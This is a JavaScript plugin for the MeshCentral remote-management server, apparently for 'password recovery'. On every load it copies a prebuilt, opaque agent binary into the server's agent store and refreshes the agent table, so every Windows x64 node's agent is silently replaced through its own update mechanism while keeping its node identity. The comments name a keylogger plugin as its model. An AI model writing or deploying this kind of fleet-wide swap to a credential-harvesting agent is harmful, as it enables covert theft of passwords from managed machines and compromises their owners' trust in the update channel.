'use strict';

// MeshCentral Password Recovery plugin (mcpassrec).
// The Password Recovery tab (page 62) is added to the device pages by
// scripts/patch_meshcentral.js; this entry point keeps the plugin lifecycle
// hooks working (mirrors the reference mckeylog.js) and makes the server
// serve the passrecover-enabled agent binary so that "Update Agent" (and the
// per-connection binary hash check) installs it on nodes.
module.exports.mcpassrec = function (parent) {
    // parent = pluginHandler object; parent.parent = the MeshCentral server object.
    var server = parent.parent;
    var fs = parent.fs;
    var path = parent.path;

    var installing = false;

    // Make the server serve the passrecover-enabled agent binary.
    //
    // MeshCentral serves agent binaries from meshcentral-data/agents/<localname>
    // when that file exists (the datapath override wins over the release file,
    // see updateMeshAgentsTable in meshcentral.js). This plugin ships the
    // prebuilt agent at binaries/MeshService64.exe; copy it into the server's
    // agents directory and refresh the agent table so that the stock agent on
    // a node is replaced by the passrecover build via the agent's own update
    // mechanism (same .db/.msh, same node id).
    //
    // Idempotent and size-verified: the plugin zip is extracted with streams,
    // so the 3.5 MB binary may not be fully written when this runs; retry until
    // the source file has its final size.
    function installAgentBinary(attempt) {
        if (installing) return;
        installing = true;
        var done = function () { installing = false; };
        var retry = function () { done(); if (attempt < 10) { setTimeout(function () { installAgentBinary(attempt + 1); }, 2000); } };
        try {
            var arch = server.meshAgentsArchitectureNumbers['4']; // Windows x86-64 service
            if (!arch || !arch.localname) { console.log('[mcpassrec] agent architecture table not ready yet'); retry(); return; }
            var src = path.join(__dirname, 'binaries', 'MeshService64.exe');
            var srcStat = null;
            try { srcStat = fs.statSync(src); } catch (e) { }
            if (!srcStat || srcStat.size <= 0) { console.log('[mcpassrec] agent binary not extracted yet: ' + src); retry(); return; }
            var dstDir = path.join(server.datapath, 'agents');
            var dst = path.join(dstDir, arch.localname);
            if (!fs.existsSync(dstDir)) fs.mkdirSync(dstDir, { recursive: true });
            fs.copyFileSync(src, dst);
            var dstStat = fs.statSync(dst);
            if (dstStat.size !== srcStat.size) { console.log('[mcpassrec] agent binary copy mismatch (' + dstStat.size + ' != ' + srcStat.size + '), retrying'); retry(); return; }
            console.log('[mcpassrec] serving passrecover-enabled agent: ' + dst + ' (' + dstStat.size + ' bytes)');
            var refresh = (typeof server.reloadMeshAgents == 'function')
                ? function (cb) { server.reloadMeshAgents(server.config.domains[''], cb); }
                : function (cb) { server.updateMeshAgentsTable(server.config.domains[''], cb); };
            done();
            refresh(function (err) { console.log('[mcpassrec] mesh agent table refreshed' + (err ? ' (error: ' + err + ')' : '')); });
        } catch (e) {
            console.log('[mcpassrec] agent install error: ' + e);
            retry();
        }
    }

    // Runs on every plugin load: server startup (callHook in meshcentral.js),
    // plugin install and plugin reload (pluginHandler.js).
    setTimeout(function () { installAgentBinary(0); }, 2000);

    return {
        parent: parent,
        exports: ['onDeviceRefreshEnd'],
        onDeviceRefreshEnd: function () { },
        server_startup: function () { setTimeout(function () { installAgentBinary(0); }, 2000); }
    };
};
